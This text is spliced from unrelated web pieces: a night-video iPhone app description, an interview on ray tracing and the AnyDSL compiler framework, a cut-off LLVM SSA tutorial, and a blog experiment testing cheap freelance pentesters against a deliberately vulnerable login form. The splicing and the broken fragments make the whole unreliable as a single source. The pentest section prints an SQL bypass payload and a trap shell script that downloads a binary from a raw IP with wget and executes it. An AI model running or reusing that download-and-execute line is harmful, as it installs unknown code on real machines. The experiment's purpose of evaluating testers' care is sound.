<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<br>
</p>
<p>In order to cover as many shooting situations as possible we’ve come up with 5 different capture modes:

</p>



<h4>Day:
</h4>



<p>The first capturing mode is not even a night mode at all. It is targeted at lower light day shots, or scenes with high dynamic range where the results of the default iPhone camera start to get too noisy. This mode contains no brightening, but because of the use of our AI denoising algorithm, resulting videos have a cleaner, more pleasant look. It’s especially useful when used with the ultra wide camera, in the case of which noise can appear even in medium-lit indoor situations.

</p>

<h4>Dusk:</h4>

<p>
  
  This mode is designed for semi-low light. It is similar to Day mode, shot at a high frame rate to maintain sharp subjects in high movement situations, but in addition to denoising it also includes a bit of additional brightening. 

</p>
<h4>
Night:
</h4>

<p>The “Night” mode is the default mode for shooting night videos. It uses a slightly longer exposure time, that combined with our denoising and frame interpolation algorithms generates a bright, clean and smooth night video. This is the mode to use for most night scenes. 
</p>

<br>
</p>


<h4>Night+:</h4>

<p>A further enhanced mode for really dark scenes. In this mode, videos have an additional amount of blur but provide a brighter night video with the same clean noise-less look. In most of these situations the built-in camera can't produce usable results.

</p>

<h4>Time-lapse:</h4>

<p>A Night Time-lapse mode, similar to the one on the new iPhone 12 default camera - now made available by NeuralCam NightVideo for older iPhones too. This mode doesn’t have sound and can handle even lower light situations, which combined with a faster playback, generates the specific night mode time-lapse look.

<br>
</p>

<h4>*Gentle Light:</h4>

<p>Each of the modes can be combined with the “gentle light” feature, where the app turns on the flashlight, but at one of the lowest levels in order to keep the resulting video still natural and avoid “blinding” people. Gentle light can be used in totally dark scenes with subjects that are close enough to be illuminated by a small amount of light.
</p>

<h3>Real-time on-device processing</h3>

<p>All this processing runs in real-time on the iPhone, making full use of the power the NeuralEngine provides. This real-time processing means that we can provide the same instant video capturing experience you’re used to with your default camera - tap to capture and everything is displayed and processed on the fly. Since this level of video processing requires quite some processing power, NightVideo is only available on devices with the A12 NeuralEngine (iPhone XR and later) and iOS 14.


</p><p>

  With real-time processing and modes covering everything from slightly low light settings to really dark scenes, NeuralCam NightVideo is the first app to provide Night Mode for Video.

<p>(Interview of Prof. Dr. Philipp Slusallek, accomplished scientist and veteran from the computer graphics field, performed in January 2015 for Seekscale company, a cloud rendering startup)</p>



<p>Hardware acceleration is hot in rendering industry right now, and while people still try to figure out how to split workloads between CPUs and GPUs, FPGAs are quickly rising. We interviewed Philipp Slusallek, Scientific Director and Computer Graphics professor at Saarland University, and talked about what’s hot right now, and above all what we can expect in CG in the near future! We first heard about Philipp by coming across this great <a href="http://www.scarydevil.com/~peter/io/raytracing-vs-rasterization.html" target="_blank" rel="noreferrer noopener">discussion</a>.</p>



<p><strong>– What rendering techniques are best adapted to each hardware (GPU/CPU)?</strong></p>



<p>We basically have two key algorithms for rendering: rasterization and ray tracing. Rasterization is a “forward” rendering approach that renders the triangles in a scene one by one (conceptually) and each time updates all pixels covered by that triangle. Ray tracing, on the other hand, traces rays for each pixel to find out which triangle is visible for that pixel.</p>



<p>While the two seem very different, there are intermediate versions, such as “tile-based rasterization” or “frustum tracing”, where only the triangles covering a part of the screen are rasterized or all rays of a tile a traced together, respectively. If you make these tiles smaller, eventually a single pixel in size, rasterization starts to look much like ray tracing and vice versa as you trace larger and larger frusta. However, we still do not have algorithms that really cover the whole range of options well.</p>



<p>Additionally, we are seeing an increased need for advanced (programmable) shading and lighting effects (e.g. global illumination for smooth indirect illumination). While they are sitting on top of the core renderer, they impose many requirements that will determine what rendering approach can or cannot be used.</p>



<p>On the HW (hardware) side: GPUs started as HW dedicated for rasterization. But they have long evolved to become essentially large parallel compute engines (with some dedicated HW thrown in for rasterization, still). On the other hand, CPUs have become much better at parallel workloads with multi-core, multi-threading, and more and increasingly wide SIMD compute units (MMX, SSE, AVX, and the now upcoming AVX-512).</p>



<p>In some sense the two general HW designs are converging towards a similar sweet spot, but coming from two very different starting points.</p>



<p>Rasterization is more dependent on good HW support to be fast and so runs best on GPUs. Ray-tracing can be implemented with very good performance on each HW architecture, probably with some advantage for CPU-like architectures if you look at the latest comparison in the Embree paper at Siggraph 2014 (which may be a bit biased).</p>



<p><strong>– For a developer working on a renderer, what is the technical arbitrage between writing for a CPU, and for a GPU?</strong></p>



<p>Let me focus on writing a full ray tracing renderer using the raw HW. Writing a “renderer” that makes good use of OpenGL/DirectX is a very different story.</p>



<p>First of all writing a really good renderer is a big challenge — but also a lot of fun, independent of the choice of rendering algorithm or HW. It reaches across many levels from highly optimized inner loops all the way up to data management of often complex scenes. It thus touches many aspects of HW and SW and is a perfect poster child for how to best design efficient code for certain HW architectures.</p>



<p>An obvious key element is strongly optimizing the inner loops of a renderer as it determines the upper limit of the achievable rendering performance. This is where a lot of efforts and research has been, and still is, spent. Today, getting the best performance usually still means to hand-optimize the code (at the assembly or intrinsics level) for specific architectures and different choices of renderer configurations. While this often pays off, it requires expert knowledge, is very tedious, and often needs to be completely rewritten as the HW or the requirements change.</p>



<p>In addition, there are also many interdependencies between choices made at this low levels and the various levels of algorithms above it. This means that one needs to keep the code flexible in order for it to adapt to these requirements. However, with current technology, flexibility conflicts strongly with achieving optimal performance.</p>



<p>As a result of all this, almost all renderers have been targeting only one HW architecture: GPUs or CPUs and even within such an architecture, algorithms might have to be configured very differently on different instances. While cross-plattform renderers have been developed, e.g. in OpenCL, OpenCL is still a very low-level language that is not well suited for all HW architectures thus limiting what can be achieved.</p>



<p>In contrast, the hardware vendors each support renderer development with their HW-specific frameworks: Nvidia’s Optix is focused essentially only on GPUs, while Intel’s Embree targets CPU-like architectures (including their MIC/Xeon Phi processors). One interesting note is that both tools (and others) had to develop their own compiler technology to develop these frameworks. While both of these frameworks are very good choices they are black boxes that each come with their own set of drawbacks and limitations.</p>



<p>Already in 2008 we showed that with the right language/compiler tools high optimization of low-level code does not necessarily limit flexibility of the overall design. Our RTFact system [HPG 2008] used C++ template metaprogramming to specialize generic code from across several levels of abstraction at compile time. With this framework, we were able to easily configure very different renderers based on the same generic code and still achieve performance within about 10% of our previous hand-optimized code in each case — which was really remarkable. Unfortunately, writing the core code via C++ template metaprogramming is really hard and results in “write-only code” that is really hard to maintain. But it showed that performance and flexibility are NOT mutually exclusive!</p>



<p>Since then we have teamed up with one of the best compiler research group here at Saarland University (Prof. Sebastian Hack) and have jointly developed “AnyDSL”: It picks up the original idea of RTfact, generalizes it beyond just rendering, and uses much improved compiler technology to implement automatic specialization of generic code. AnyDSL provides a completely new programming models that offers developers a way for formulating hierarchies of conceptual abstractions while still allowing the compiler to eliminate any overhead usually associated with such abstractions (e.g. virtual function calls in C++).</p>



<p>This finally allows for writing completely generic code at each level of abstraction, specifying how that code should make use of abstractions at the lower levels. Finally, at the lowest level, code that has been coming from the different levels is combined and aggressively specialized using novel compiler algorithms to essentially interpret and partially execute any code that is knows at compile time. This is so effective because at these low level a lot of information that we abstracted from at the high levels is now available, such as information about the HW and the context in which some generic high-level code should be executed and which can be taken into account by the compiler. This approach combined the flexibility of hierarchical abstractions with the ability to generate optimized code that rival and often actually exceed the performance of hand-optimized code.</p>



<p>For example, our tests in image processing show that this approach often beats hand-optimized code because that code is very tedious and difficult to write such that not all promising optimization options are actually explored. Since simply use the generic code plus some rather simple mapping code for each specific HW, exploring the space of possible optimizations is much larger.</p>



<p>By now, we have already written a full ray tracer in AnyDSL that compiles and runs efficiently both on various different GPUs and CPUs. However, not all optimizations have been applied yet, so that we cannot really compare its performance yet. This will happen in the next few months but the partial results we have so far are already very promising.</p>



<p><strong>– Corona Render </strong><a href="http://home.seekscale.com/blog/corona-render-1.0-a-peek-into-interactive-rendering"><strong>uses</strong></a><strong> for example Intel Embree ray tracing library, for the CPU. What do you think of this solution?</strong></p>



<p>As I argue above, these tools are very useful. They provide hand-optimized kernels that solve some of the core problems, particular the inner loops and can thus be used as the basis for the higher layers, just as Corona did. However, they are essentially black boxes which makes it harder to adapt them to different purposes.</p>



<p>I believe that we need to go beyond these individual optimized kernels and create generic, adaptable, and reusable building blocks for rendering. That can be combined in flexible ways to create optimized renderers for many configurations and HW platforms. So far, we have been missing the right tools to even think how this could be done.</p>



<p>With AnyDSL we now have a tool that for the first time allows us to address this challenge. Now we are investigating how the to design such a flexible rendering framework: What are the right abstractions to be used at the different levels? How do we best map them to HW platforms? Which algorithms work best in what context and how do we need to formulate them, so they can easily be combined? How do we determine the data layout to optimize for different algorithms using it? And so on.</p>



<p>Essentially, AnyDSL allows us to rethink the design of renderers in a fundamentally new way.</p>

<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>

  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>

<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

    <td><span color="green">âœ“</span></td>
  </tr>
</tbody>
</table>

<p>
